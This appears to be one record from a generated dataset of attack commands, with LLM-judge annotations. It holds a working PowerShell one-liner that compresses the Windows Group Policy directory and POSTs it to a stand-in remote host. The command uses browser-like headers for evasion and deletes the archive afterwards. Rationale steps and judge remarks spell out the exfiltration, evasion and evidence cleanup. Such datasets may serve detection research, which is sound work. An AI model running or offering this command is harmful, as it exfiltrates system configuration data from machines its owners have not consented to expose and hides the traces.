command: $ProgressPreference='SilentlyContinue'; $zip=Join-Path $env:TEMP ('pol_'+(Get-Date -Format yyyyMMddHHmmss)+'.zip'); Compress-Archive -Path 'C:\Windows\System32\GroupPolicy' -DestinationPath $zip -Force; Invoke-WebRequest -Uri 'https://img.example-cdn.net/push/policy' -Method Post -InFile $zip -ContentType 'application/zip' -Headers @{ 'User-Agent'='Mozilla/5.0'; 'Cache-Control'='no-cache' } -ErrorAction SilentlyContinue; Remove-Item $zip -Force
explanation: Compresses local Group Policy artifacts and exfiltrates them via HTTPS POST to a remote collection endpoint.
rationale_steps: Package Group Policy files that can reveal system constraints and scripts.
Transfer the archive using Invoke-WebRequest with neutral headers.
Suppress progress and erase temporary files afterward.

llm_judgments.syntactic_justification: Valid PowerShell with balanced quotes and parentheses, proper semicolon separators, and correct cmdlet parameters and hashtable syntax.
llm_judgments.semantic_justification: It compresses the specified directory, exfiltrates the archive via HTTPS POST using Invoke-WebRequest, and deletes the file afterward, aligning with automated exfiltration behavior.

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed with proper variable assignments, function calls, parameter usage, balanced quotes/parentheses/braces, and appropriate command separators.
llm_judgments.semantic_justification: The command fully implements automated exfiltration by compressing Group Policy data into a timestamped ZIP file, exfiltrating it via HTTPS POST with browser-like headers for evasion, and cleaning up the evidence afterward.
